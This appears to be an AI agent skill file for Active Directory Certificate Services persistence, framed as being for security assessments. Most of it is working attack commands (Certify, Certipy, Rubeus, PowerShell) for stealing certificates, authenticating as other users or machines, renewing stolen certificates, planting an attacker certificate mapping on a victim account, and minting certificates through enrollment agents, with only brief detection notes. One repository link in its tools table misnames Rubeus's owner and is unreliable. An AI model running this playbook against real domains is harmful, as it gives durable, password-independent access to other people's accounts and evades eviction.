---
name: ad-cs-persistence
description: Active Directory Certificate Services (AD CS) persistence techniques for security assessments. Use this skill whenever analyzing AD CS configurations, planning certificate-based persistence, understanding PKINIT attacks, working with certificate templates in Active Directory, or investigating altSecurityIdentities abuse. Covers user/machine certificate persistence, certificate renewal, explicit mapping attacks, enrollment agent abuse, and 2025 strong mapping enforcement implications. Make sure to use this skill for any AD CS enumeration, certificate template analysis, or certificate-based authentication attacks in Windows domain environments.
---

# AD CS Account Persistence

This skill covers certificate-based persistence techniques in Active Directory environments, based on research from SpecterOps' "Certified Pre-Owned" methodology.

## PERSIST1: User Certificate Persistence

When a certificate template allows client authentication, request and steal the certificate to maintain persistence independent of password changes. The default `User` template often permits this.

### Enumerate and Request

```bash
# Find templates supporting client authentication
Certify.exe find /clientauth

# Request a user certificate from an Enterprise CA
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (supports RPC/DCOM/WebEnrollment)
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```

### Authenticate with Certificate

```bash
# Convert PEM to PFX (if using Certify output)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# PKINIT authentication with Rubeus
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```

**Why this works:** Certificates authenticate independently of passwords. Combined with other techniques, this enables persistent access without touching LSASS, even from non-elevated contexts.

---

## PERSIST2: Machine Certificate Persistence

With SYSTEM privileges on a host, enroll the machine account for a certificate using the `Machine` template. This enables S4U2Self for local services and provides durable host persistence.

```bash
# Request machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine account
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```

---

## PERSIST3: Certificate Renewal Persistence

Extend access by renewing certificates before expiration, obtaining fresh credentials without creating new request artifacts tied to the original principal.

```bash
# Renew using Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
            -template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```

**Operational tip:** Track lifetimes on attacker-held PFX files and renew early. Renewal also updates certificates with modern SID mapping extensions, keeping them usable under stricter DC policies.

---

## PERSIST4: Explicit Certificate Mapping (altSecurityIdentities)

If you can write to a target account's `altSecurityIdentities` attribute, explicitly map an attacker-controlled certificate to that account. This persists across password changes and works under modern DC enforcement with strong mapping formats.

### Workflow

1. Obtain or issue a client-auth certificate you control
2. Extract a strong identifier (Issuer+Serial, SKI, or SHA1-PublicKey)
3. Add explicit mapping to victim's `altSecurityIdentities`
4. Authenticate with your certificate; DC maps it to the victim

### Example (PowerShell)

```powershell
# Create strong Issuer+Serial mapping
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim account
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

Then authenticate:

```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
```

### Mapping Format Requirements

**Use strong formats only:**
- `X509IssuerSerialNumber` (X509:<I>issuer<SR>serial)
- `X509SKI` (X509:<SKI>subjectKeyIdentifier)
- `X509SHA1PublicKey` (X509:<SHA1>publicKeyHash)

**Avoid weak formats (deprecated/blocked):**
- Subject/Issuer
- Subject-only
- RFC822 email

The certificate chain must build to a root trusted by the DC. Enterprise CAs in NTAuth are typically trusted.

---

## PERSIST5: Enrollment Agent Persistence

An Enrollment Agent certificate allows minting new logon-capable certificates on behalf of any user. Keep the agent PFX offline as a persistence token.

```bash
# Request Enrollment Agent certificate (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user certificate on behalf of another principal
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
                   /onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
           -template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```

**Remediation:** Revocation of the agent certificate or removal of template permissions is required to evict this persistence.

---

## 2025 Strong Certificate Mapping Enforcement

Microsoft KB5014754 introduced Strong Certificate Mapping Enforcement on domain controllers. Since February 11, 2025, DCs default to Full Enforcement, rejecting weak/ambiguous mappings.

### Practical Implications

- Pre-2022 certificates lacking the SID mapping extension may fail implicit mapping under Full Enforcement
- Maintain access by:
  - Renewing certificates through AD CS (to obtain SID extension)
  - Planting strong explicit mappings in `altSecurityIdentities` (PERSIST4)
- Strong explicit mappings (Issuer+Serial, SKI, SHA1-PublicKey) continue working
- Weak formats (Issuer/Subject, Subject-only, RFC822) can be blocked

### Detection Recommendations

Monitor and alert on:
- Changes to `altSecurityIdentities` attribute
- Issuance/renewals of Enrollment Agent and User certificates
- CA issuance logs for on-behalf-of requests
- Unusual renewal patterns

---

## Tools Reference

| Tool | Purpose | Repository |
|------|---------|------------|
| **Certify** | AD CS enumeration and certificate requests | https://github.com/GhostPack/Certify |
| **Certipy** | AD CS attacks (RPC/DCOM/WebEnrollment) | https://github.com/ly4k/Certipy |
| **Rubeus** | Kerberos attacks including PKINIT | https://github.com/GentilKiwi/Rubeus |

---

## References

- SpecterOps "Certified Pre-Owned" research: https://specterops.io/assets/resources/Certified_Pre-Owned.pdf
- Microsoft KB5014754: https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers
- Certipy Command Reference: https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
